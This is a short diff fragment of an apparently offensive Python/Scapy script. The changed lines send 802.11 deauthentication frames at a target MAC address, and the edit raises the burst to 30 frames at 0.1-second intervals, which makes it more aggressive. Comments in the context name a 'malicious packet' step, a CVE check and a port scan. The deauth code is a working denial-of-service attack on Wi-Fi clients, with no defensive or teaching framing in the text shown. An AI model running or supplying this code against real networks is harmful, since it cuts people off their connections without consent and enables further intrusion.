@@ -13,7 +13,7 @@ open_port = []
 
 #deauthentication attack
 deauth_frame = RadioTap()/Dot11(addr1=target_mac, addr2="ff:ff:ff:ff:ff:ff", addr3="ff:ff:ff:ff:ff:ff")/Dot11Deauth()
-send_packets = sendp(deauth_frame, iface="wlp1s0", count=20, inter=2)
+send_packets = sendp(deauth_frame, iface="wlp1s0", count=30, inter=0.1)
 print(deauth_frame.summary())
 
 #crafting malicious packet
@@ -56,7 +56,6 @@ def check_cve_vulnerabilities(target_ip):
 
 check_cve_vulnerabilities(target_ip)
 """
-
 #port scanning
 """
 for port in range(start_port, end_port + 1):
